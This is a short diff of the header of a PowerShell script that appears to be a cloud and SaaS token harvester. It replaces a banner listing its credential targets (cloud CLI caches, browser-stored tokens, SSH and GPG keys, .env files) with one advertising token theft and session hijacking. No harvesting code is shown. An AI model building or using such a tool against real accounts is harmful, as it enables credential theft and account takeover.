@@ -1,28 +1,11 @@
-<#
-============================================================================
-  FLLC — CLOUD & SaaS TOKEN HARVESTER v1.777
-  ═══════════════════════════════════════════
-  
-  Harvests authentication tokens, session cookies, and credentials from:
-    ■ Microsoft 365 / Azure AD (MSAL cache, WAM tokens, Office tokens)
-    ■ Google Workspace (Chrome profiles, gcloud, Firebase)
-    ■ AWS (credentials, config, SSO cache, ECS metadata)
-    ■ Azure CLI / PowerShell tokens
-    ■ GitHub / GitLab / Bitbucket tokens
-    ■ Docker / Kubernetes configs
-    ■ Terraform state files (contain plaintext secrets)
-    ■ Vault / Consul tokens
-    ■ Slack / Teams / Discord tokens (from browser storage)
-    ■ NPM / PyPI / NuGet tokens
-    ■ SSH agent keys + config
-    ■ GPG keys
-    ■ Database connection strings
-    ■ .env files recursively
-    ■ IDE stored credentials (VS Code, JetBrains, Sublime)
-  
-  FLLC 2026 | Authorized penetration testing only.
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | CLOUD HARVESTER v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  M365/Google/Azure/AWS Token Harvesting                          ║
+   ║  Browser token theft | CLI credential dump | OAuth cache         ║
+   ║  Cloud session hijacking | Service principal extraction          ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 param(
     [string]$OutputDir = "$PSScriptRoot\..\..\collected\cloud",
